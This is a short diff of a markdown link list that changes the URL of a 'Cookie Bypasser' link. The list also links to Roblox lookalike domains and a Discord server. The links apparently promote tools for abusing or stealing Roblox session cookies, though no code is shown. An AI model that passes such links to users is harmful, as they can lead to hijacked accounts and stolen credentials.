@@ -13,7 +13,7 @@
 [Game Discover](https://roblox.sx/discover)
 
 [Cookie Bypasser 1](https://roblox.com.sc/generator/reflesher)
-[Cookie Bypasser 2](https://www.terminalholder.xyz/)
+[Cookie Bypasser 2](https://terminalholder.xyz/)
 
 ## [Join Discord Server](https://discord.gg/R9K9gg8HPZ)
 
